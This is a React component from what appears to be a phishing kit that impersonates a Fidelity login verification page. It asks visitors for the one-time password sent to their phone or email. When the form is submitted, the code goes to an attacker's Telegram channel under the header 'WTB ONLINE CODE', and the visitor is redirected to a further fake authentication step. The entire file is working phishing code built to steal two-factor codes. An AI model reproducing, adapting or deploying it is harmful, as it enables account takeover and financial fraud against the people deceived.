import React from "react";
import Logo from "../assets/logo.jpeg";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Code() {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formInput, setFormInput] = React.useState<code>({
    code: ""
  });

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const message = `
        ---- WTB ONLINE CODE -----
        Code: ${formInput.code}
        `;
    setIsLoading(true);
    await TelegramSend(message);
    cookies.set("code", formInput);
    setIsLoading(false);
    navigate("../login/auth/2", { replace: true });
  }

  return (
    <>
      <div className="content">
        <div className="form">
            <form onSubmit={handleSubmit} method="POST">
          <div className="form-item">
          <div className="brand">
                <img src={Logo} alt="" />
              </div>
            <h2>Verification</h2>
            <p>In order to verify your identity, enter the one time password sent to your phone/email.</p>
            
              <div className="form-field">
                
                <input onChange={handleInputChange} name="code" type="text" />
              </div>

              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "flex-end",
                  marginTop: "-20px",
                }}
              >
              
                {isLoading ? (
                  <div className="form-field">
                    <button style={{ width: 130, height: 50 }} type="button">Please wait...</button>
                  </div>
                ) : (
                  <div className="form-field">
                    <button style={{ width: 120, height: 50 }} type="submit">
                      Continue
                    </button>
                  </div>
                )}
              </div>
          </div>
          </form>
        </div>
      </div>

      <div className="footer">
        <p style={{ textAlign: "center" }}>
          New to Fidelity? <a href="">Open an account</a> or{" "}
          <a href="">sign up</a>
        </p>
      </div>
    </>
  );
}
